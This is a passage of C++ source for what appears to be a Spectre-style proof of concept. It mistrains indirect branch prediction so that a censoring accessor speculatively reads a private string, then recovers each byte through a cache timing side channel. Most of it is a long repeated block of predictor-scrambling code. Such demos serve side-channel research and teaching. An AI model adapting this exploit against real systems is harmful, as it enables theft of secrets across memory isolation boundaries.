      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
  }

}

// Objective: given some control over accesses to the *non-secret* string
// "xxxxxxxxxxxxxx", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution and
// side channel attacks. The public data is intentionally just xxx, so that
// there are no collisions with the secret and we don't have to use variable
// offset.
const char *public_data = "xxxxxxxxxxxxxxxx";
const char *private_data = "It's a s3kr3t!!!";
constexpr size_t kAccessorArrayLength = 1024;
constexpr size_t kCacheLineSize = 64;

// DataAccessor provides an interface to access bytes from either the public or
// the private storage.
class DataAccessor {
 public:
  virtual char GetDataByte(size_t index, bool read_from_private_data) = 0;
  virtual ~DataAccessor() {};
 protected:
  // Helper method that picks the pointer that you want to read from.
  const char *GetDataPtr(bool read_from_private_data) const {
    // This is the same as:
    // return read_from_private_data ? private_data : public_data;
    // It only avoids branching in case it is compiled without optimizations.
    return public_data + (
        private_data - public_data) * static_cast<int>(read_from_private_data);
  }
};

// Behaves exactly by the specification, if you ask for public data, it gives
// you public data, if you ask for private data, you get private data.
class RealDataAccessor: public DataAccessor {
 public:
  char GetDataByte(size_t index, bool read_from_private_data) override {
    return GetDataPtr(read_from_private_data)[index];
  }
};

// It gives you only public data, no matter what you ask for. Useful for cases
// where you never want to leak the private data.
class CensoringDataAccessor: public DataAccessor {
 public:
  char GetDataByte(size_t index, bool /* read_from_private_data */) override {
    return public_data[index];
  }
};

// Leaks the byte that is physically located at private_data[offset], without
// ever loading it. In the abstract machine, and in the code executed by the
// CPU, this function does not load any memory except for what is in the bounds
// of `public_data`, and local auxiliary data.
//
// Instead, the leak is performed by indirect branch prediction during
// speculative execution, mistraining the predictor to jump to the address of
// GetDataByte implemented by RealDataAccessor that is unsafe for
// CensoringDataAccessor.
static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
  auto array_of_pointers =
      std::unique_ptr<std::array<DataAccessor *, kAccessorArrayLength>>(
          new std::array<DataAccessor *, kAccessorArrayLength>());

  // RealDataAccessor, leaks both private and public data according to the
  // parameter it is provided with.
  auto real_data_accessor = std::unique_ptr<DataAccessor>(
      new RealDataAccessor);

  // CensoringDataAccessor, architecturally leaks only public data and ignores
  // the read_from_private_data parameter.
  auto censoring_data_accessor = std::unique_ptr<DataAccessor>(
      new CensoringDataAccessor);

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Before each run all pointers are reset to point to the
    // real_data_accessor.
    for (auto &pointer : *array_of_pointers) {
      pointer = real_data_accessor.get();
    }

    // Only one of the pointers is then changed so that it points to the
    // CensoringDataAccessor. Its index is local_pointer_index.
    size_t local_pointer_index = run % kAccessorArrayLength;
    (*array_of_pointers)[local_pointer_index] = censoring_data_accessor.get();

    for (size_t i = 0; i <= local_pointer_index; ++i) {
      DataAccessor *accessor = (*array_of_pointers)[i];
      // On the local_pointer_index we have the censoring data accessor for
      // which the read_private_data can be true, because that accessor will
      // ignore that argument and use the public data anyway.
      bool read_private_data = (i == local_pointer_index);

      // When i == local_pointer_index, we get size of the
      // CensoringDataAccessor, otherwise of the RealDataAccessor.
      size_t object_size_in_bytes = sizeof(
          RealDataAccessor) + (sizeof(CensoringDataAccessor) - sizeof(
              RealDataAccessor)) * (i == local_pointer_index);

      // We make sure to flush whole accessor object in case it is
      // hypothetically on multiple cache-lines.
      const char *accessor_bytes = reinterpret_cast<const char*>(accessor);
      FlushFromCache(accessor_bytes, accessor_bytes + object_size_in_bytes);

      // Speculative fetch at the offset. Architecturally it fetches
      // always from the public_data, though speculatively it fetches the
      // private_data when i is at the local_pointer_index.
      if (i == local_pointer_index) { scramble(); }
      asm volatile("lfence");
      auto fp = &DataAccessor::GetDataByte;
      ForceRead(isolated_oracle.data() + static_cast<size_t>((accessor->*fp)(offset, read_private_data)));
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 1000000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static uint64_t now() {
  uint32_t lh, hh;
  asm volatile("lfence; rdtscp" : "=a"(lh), "=d"(hh) : : "%rcx");
  return ((uint64_t) hh << 32) | lh;
}

int main() {
  uint64_t b, a;
  b = now();
  scramble();
  a = now();
  printf("Scramble took %ld cycles\n", a-b);

  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(public_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
